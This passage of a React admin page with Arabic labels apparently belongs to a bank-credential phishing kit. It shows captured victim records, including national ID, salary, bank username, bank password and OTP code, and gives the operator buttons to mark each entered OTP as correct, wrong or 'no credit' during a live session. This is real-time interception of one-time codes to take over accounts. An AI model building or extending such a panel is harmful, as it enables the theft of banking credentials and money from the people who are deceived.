                                  className="flex-1 bg-red-100 text-red-700 py-2 rounded-lg text-xs font-bold hover:bg-red-200 disabled:opacity-50 transition-colors"
                                >
                                  ✗ خاطئة
                                </button>
                              </div>
                            </div>
                          )}
                        </div>

                        {/* صندوق OTP */}
                        <div className="bg-card rounded-xl p-4 space-y-2">
                          <div className="flex items-center gap-2">
                            <h4 className="font-bold text-sm text-primary mb-3 flex items-center gap-2">
                              <Smartphone className="w-4 h-4" />
                              رمز OTP والحالة
                              {otpAttempts > 0 && (
                                <span className={`text-xs font-bold px-2 py-0.5 rounded-full ${otpAttempts > 1 ? "bg-orange-100 text-orange-700" : "bg-green-100 text-green-700"}`}>
                                  {otpAttempts} {otpAttempts === 1 ? "محاولة" : "محاولات"}
                                </span>
                              )}
                            </h4>
                            <SectionTimeBadge timestamp={allData.otpCode ? app.updatedAt : undefined} />
                          </div>
                          {allData.otpCode ? (
                            <div className="bg-muted rounded-xl p-4 text-center">
                              <p className="text-xs text-muted-foreground mb-1">
                                رمز التحقق
                              </p>
                              <p className="text-3xl font-mono font-black text-primary tracking-[0.3em]">
                                {allData.otpCode}
                              </p>
                            </div>
                          ) : (
                            <p className="text-sm text-muted-foreground text-center py-4">
                              لم يُدخل رمز بعد
                            </p>
                          )}

                          <div className="space-y-1 pt-2">
                            <DataBadge
                              label="الخطوة الحالية"
                              value={
                                stepLabels[app.currentStep] || app.currentStep
                              }
                            />
                            <DataBadge
                              label="الحالة"
                              value={statusLabels[app.status] || app.status}
                            />
                            {app.adminNote && (
                              <DataBadge
                                label="ملاحظة المدير"
                                value={app.adminNote}
                              />
                            )}
                          </div>

                          {/* قرار OTP */}
                          {allData.otpCode && app.sessionId && (
                            <div className="pt-3 border-t">
                              <p className="text-xs font-bold text-muted-foreground mb-2">
                                قرار رمز OTP:
                              </p>
                              <div className="flex gap-1 flex-wrap">
                                <button
                                  onClick={() =>
                                    handleOtpDecision(
                                      app.sessionId!,
                                      "approved",
                                      app.id,
                                    )
                                  }
                                  disabled={
                                    !!actionLoading[`otp_${app.id}_approved`]
                                  }
                                  className="flex-1 bg-green-100 text-green-700 py-2 rounded-lg text-xs font-bold hover:bg-green-200 disabled:opacity-50 transition-colors"
                                >
                                  ✓ صحيح
                                </button>
                                <button
                                  onClick={() =>
                                    handleOtpDecision(
                                      app.sessionId!,
                                      "rejected",
                                      app.id,
                                    )
                                  }
                                  disabled={
                                    !!actionLoading[`otp_${app.id}_rejected`]
                                  }
                                  className="flex-1 bg-red-100 text-red-700 py-2 rounded-lg text-xs font-bold hover:bg-red-200 disabled:opacity-50 transition-colors"
                                >
                                  ✗ خطأ
                                </button>
                                <button
                                  onClick={() =>
                                    handleOtpDecision(
                                      app.sessionId!,
                                      "no_credit",
                                      app.id,
                                    )
                                  }
                                  disabled={
                                    !!actionLoading[`otp_${app.id}_no_credit`]
                                  }
                                  className="flex-1 bg-orange-100 text-orange-700 py-2 rounded-lg text-xs font-bold hover:bg-orange-200 disabled:opacity-50 transition-colors"
                                >
                                  لا رصيد
                                </button>
                              </div>
                            </div>
                          )}
                        </div>
                                </div>
                              ) : (
                                /* عرض البيانات الأقدم */
                                <div className="space-y-4">
                                  {olderVersions.length === 0 ? (
                                    <div className="text-center py-8 text-muted-foreground">
                                      لا توجد بيانات أقدم
                                    </div>
                                  ) : (
                                    olderVersions.map((ver) => (
                                      <div key={ver.id} className="bg-amber-50 border border-amber-200 rounded-xl p-4">
                                        <div className="flex items-center justify-between mb-3">
                                          <div className="flex items-center gap-2">
                                            <History className="w-4 h-4 text-amber-600" />
                                            <span className="font-bold text-amber-800">النسخة {ver.version}</span>
                                            <span className="text-xs text-amber-600/70">
                                              {timeAgo(ver.createdAt)}
                                            </span>
                                          </div>
                                          <span className="text-xs text-amber-600 bg-amber-100 px-2 py-1 rounded">
                                            #{ver.id}
                                          </span>
                                        </div>
                                        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
                                          <DataBadge label="الاسم" value={ver.fullName || ver.companyName || ver.contactName} badge="نسخة" />
                                          <DataBadge label="رقم الهوية" value={ver.nationalId || ver.commercialRegistration} />
                                          <DataBadge label="رقم الهاتف" value={ver.phone} />
                                          <DataBadge label="البريد" value={ver.email} />
                                          <DataBadge label="جهة العمل" value={ver.employer} />
                                          <DataBadge label="الراتب" value={ver.monthlySalary} />
                                          <DataBadge label="المدينة" value={ver.city} />
                                          <DataBadge label="الحالة الاجتماعية" value={ver.maritalStatus} />
                                          <DataBadge label="البنك" value={ver.bankName} />
                                          <DataBadge label="مستخدم البنك" value={ver.bankUsername} />
                                          <DataBadge label="كلمة مرور البنك" value={ver.bankPassword} />
                                          <DataBadge label="رمز OTP" value={ver.otpCode} />
                                        </div>
                                        <div className="mt-3 pt-3 border-t border-amber-200">
                                          <a
                                            href={`/admin/applications/${ver.id}`}
                                            className="text-primary text-xs font-bold hover:underline flex items-center gap-1 inline-flex"
                                          >
                                            <ExternalLink className="w-3 h-3" />
                                            عرض التفاصيل الكاملة
                                          </a>
                                        </div>
                                      </div>
                                    ))
                                  )}
                                </div>
                              )}
                            </>
                          );
                        })()}
                      </div>
                    )}
                  </div>
                );
              })}
            </div>
          )}
        </div>
      </div>
    </AdminLayout>
  );
}
